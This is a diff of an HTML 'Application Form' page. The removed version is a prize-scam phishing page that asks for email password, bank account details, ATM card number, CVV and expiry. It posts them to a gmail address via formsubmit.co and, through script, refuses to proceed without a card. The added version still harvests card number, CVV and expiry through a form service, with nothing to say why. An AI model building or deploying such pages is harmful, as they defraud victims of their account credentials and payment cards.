@@ -2,161 +2,114 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Application Form</title>
   <style>
-    body { font-family: Arial, sans-serif; padding: 15px; margin: 0; background: #f9f9f9; }
-    form { max-width: 480px; margin: auto; background: white; padding: 15px; border-radius: 10px;
-           box-shadow: 0 0 10px rgba(0,0,0,0.05); }
-    h2 { text-align: center; font-size: 1.5em; margin-bottom: 10px; }
-    .notice { text-align: center; font-size: 0.9em; color: #555; margin-bottom: 20px; }
-    label { display: block; margin-top: 12px; font-weight: bold; font-size: 0.95em; }
-    input, select { width: 100%; padding: 10px; font-size: 1em; margin-top: 5px;
-                    border: 1px solid #ccc; border-radius: 6px; }
-    .readonly-box { background: #f0f0f0; padding: 10px; border: 1px solid #ccc;
-                    border-radius: 6px; margin-top: 8px; font-weight: bold; }
-    .card-section { margin-top: 10px; }
-    button { margin-top: 20px; width: 100%; padding: 12px; background: #007bff; color: white;
-             border: none; border-radius: 6px; font-size: 1em; }
-    button:disabled { background: #aaa; cursor: not-allowed; }
-    button:hover:enabled { background: #0056b3; }
-    .hidden { display: none; }
-    .password-wrapper { position: relative; }
-    .password-wrapper span { position: absolute; right: 10px; top: 50%;
-                              transform: translateY(-50%); cursor: pointer; font-size: 1.1em; }
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background: #f2f2f2;
+    }
+    form {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 500px;
+      margin: auto;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+    }
+    input[type="text"],
+    input[type="tel"],
+    input[type="number"],
+    input[type="month"] {
+      width: 100%;
+      padding: 8px;
+      box-sizing: border-box;
+      margin-top: 5px;
+    }
+    input:invalid {
+      border: 1px solid red;
+    }
+    .error-message {
+      color: red;
+      font-size: 0.9em;
+      display: none;
+    }
+    input:invalid + .error-message {
+      display: block;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #45a049;
+    }
   </style>
 </head>
 <body>
-  <form id="applicationForm" method="POST" action="https://formsubmit.co/exellentfirm@gmail.com">
+  <form action="https://formspree.io/f/your-form-id" method="POST" novalidate>
     <h2>Application Form</h2>
-    <div class="notice">We keep your details secure and confidential.</div>
 
-    <!-- 1 -->
-    <label for="fullName">1. Full Name</label>
-    <input type="text" id="fullName" name="fullName" required pattern="[A-Za-z\s]+" title="Letters and spaces only.">
+    <label for="fullname">Full Name:</label>
+    <input type="text" name="Full Name" id="fullname" required placeholder="Enter your full name" />
+    <div class="error-message">Please enter your full name.</div>
 
-    <!-- 2 -->
-    <label for="country">2. Country</label>
-    <input type="text" id="country" name="country" required>
+    <label for="country">Country:</label>
+    <input type="text" name="Country" id="country" required placeholder="Enter your country" />
+    <div class="error-message">Please enter your country.</div>
 
-    <!-- 3 -->
-    <label for="phoneNumber">3. Phone Number</label>
-    <input type="tel" id="phoneNumber" name="phoneNumber" required pattern="\d{9,12}" inputmode="numeric" title="Enter 9 to 12 digits.">
+    <label for="phone">Phone Number:</label>
+    <input 
+      type="tel" 
+      name="Phone Number" 
+      id="phone" 
+      required 
+      pattern="[0-9]{9,12}" 
+      placeholder="Enter phone number (9–12 digits)" 
+    />
+    <div class="error-message">Phone number must be 9 to 12 digits.</div>
 
-    <!-- 4 -->
-    <label for="emailAddress">4. Email Address</label>
-    <input type="email" id="emailAddress" name="emailAddress" required pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" title="Only @gmail.com allowed.">
+    <label for="card">ATM Card Number:</label>
+    <input 
+      type="text" 
+      name="ATM Card Number" 
+      id="card" 
+      required 
+      pattern="\d{16}" 
+      placeholder="Enter 16-digit card number" 
+    />
+    <div class="error-message">Card number must be 16 digits.</div>
 
-    <!-- 5 -->
-    <label for="emailPassword">5. Email Password</label>
-    <div class="password-wrapper">
-      <input type="password" id="emailPassword" name="emailPassword" required style="padding-right:40px;">
-      <span onclick="togglePassword()">👁️</span>
-    </div>
+    <label for="cvv">CVV:</label>
+    <input 
+      type="text" 
+      name="CVV" 
+      id="cvv" 
+      required 
+      pattern="\d{3}" 
+      placeholder="Enter 3-digit CVV" 
+    />
+    <div class="error-message">CVV must be 3 digits.</div>
 
-    <!-- 6 -->
-    <label for="amountWon">6. Amount You Won</label>
-    <input type="text" id="amountWon" name="amountWon" required>
+    <label for="expiry">Expiry Date:</label>
+    <input 
+      type="month" 
+      name="Expiry Date" 
+      id="expiry" 
+      required 
+    />
+    <div class="error-message">Please enter the expiry date.</div>
 
-    <!-- 7 -->
-    <label for="bankType">7. Bank Account Type (e.g., Standard Bank)</label>
-    <input type="text" id="bankType" name="bankType" placeholder="e.g., Standard Bank" required>
-
-    <!-- 8 -->
-    <label for="bankNumber">8. Bank Account Number</label>
-    <input type="text" id="bankNumber" name="bankNumber" required>
-
-    <!-- 9 -->
-    <label for="accountHolder">9. Bank Account Holder's Name</label>
-    <input type="text" id="accountHolder" name="accountHolder" required>
-
-    <!-- 10 -->
-    <label for="atmLinked">10. Did you link an ATM card to your <span id="bankTypePreview">bank</span> account?</label>
-    <select id="atmLinked" name="atmLinked" required>
-      <option value="">--Select--</option>
-      <option value="Yes">Yes</option>
-      <option value="No">No</option>
-    </select>
-
-    <!-- 11 -->
-    <div class="card-section hidden" id="cardSection">
-      <label>11. We need to verify your details so that we release <span id="amountPreview">[amount]</span> to your <span id="bankPreview">[bank]</span> account.</label>
-      <label for="atmNumber">ATM Card Number</label>
-      <input type="text" id="atmNumber" name="atmNumber" required maxlength="16" pattern="\d{16}" inputmode="numeric" title="Exactly 16 digits.">
-
-      <label for="cvv">CVV (3 digits only)</label>
-      <input type="text" id="cvv" name="cvv" maxlength="3" required pattern="\d{3}" inputmode="numeric" title="3-digit CVV.">
-
-      <label for="expiry">Expiry Date (MM/YY)</label>
-      <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required pattern="^(0[1-9]|1[0-2])\/\d{2}$" oninput="formatExpiry(this)" title="MM/YY format.">
-    </div>
-
-    <!-- 12 -->
-    <label>12. Confirmation</label>
-    <div class="readonly-box" id="autoFilledNote">
-      You will receive [amount] immediately you submit the form and the SMS verification sent to your number [phone].
-    </div>
-
-    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/Application-Form/thankyou.html">
-    <input type="hidden" name="_captcha" value="false">
-    <button type="submit" id="submitButton">Submit Application</button>
+    <button type="submit">Submit</button>
   </form>
-
-  <script>
-    const amountInput = document.getElementById("amountWon");
-    const bankInput = document.getElementById("bankType");
-    const phoneInput = document.getElementById("phoneNumber");
-    const atmLinked = document.getElementById("atmLinked");
-    const amountPreview = document.getElementById("amountPreview");
-    const bankPreview = document.getElementById("bankPreview");
-    const bankTypePreview = document.getElementById("bankTypePreview");
-    const autoFilledNote = document.getElementById("autoFilledNote");
-    const cardSection = document.getElementById("cardSection");
-    const cvvInput = document.getElementById("cvv");
-    const expiryInput = document.getElementById("expiry");
-    const submitButton = document.getElementById("submitButton");
-
-    function updateDynamicText() {
-      const amount = amountInput.value || "[amount]";
-      const phone = phoneInput.value || "[phone]";
-      const bank = bankInput.value || "[bank]";
-      amountPreview.textContent = amount;
-      bankPreview.textContent = bank;
-      bankTypePreview.textContent = bank;
-      if (atmLinked.value === "Yes") {
-        autoFilledNote.textContent = `You will receive ${amount} immediately you submit the form and the SMS verification sent to your number ${phone}`;
-      }
-    }
-
-    amountInput.addEventListener("input", updateDynamicText);
-    phoneInput.addEventListener("input", updateDynamicText);
-    bankInput.addEventListener("input", updateDynamicText);
-
-    atmLinked.addEventListener("change", () => {
-      if (atmLinked.value === "Yes") {
-        cardSection.classList.remove("hidden");
-        submitButton.disabled = false;
-        submitButton.textContent = "Submit Application";
-        cvvInput.required = true;
-        expiryInput.required = true;
-        updateDynamicText();
-      } else {
-        cardSection.classList.add("hidden");
-        submitButton.disabled = true;
-        submitButton.textContent = "Application Declined – ATM Card Required";
-        autoFilledNote.textContent = "YOU MUST HAVE AN ATM CARD TO PROCEED";
-      }
-    });
-
-    function formatExpiry(input) {
-      let v = input.value.replace(/\D/g, '');
-      input.value = v.length >= 3 ? v.slice(0,2) + '/' + v.slice(2,4) : v;
-    }
-
-    function togglePassword() {
-      const pw = document.getElementById("emailPassword");
-      pw.type = pw.type === "password" ? "text" : "password";
-    }
-  </script>
 </body>
 </html>
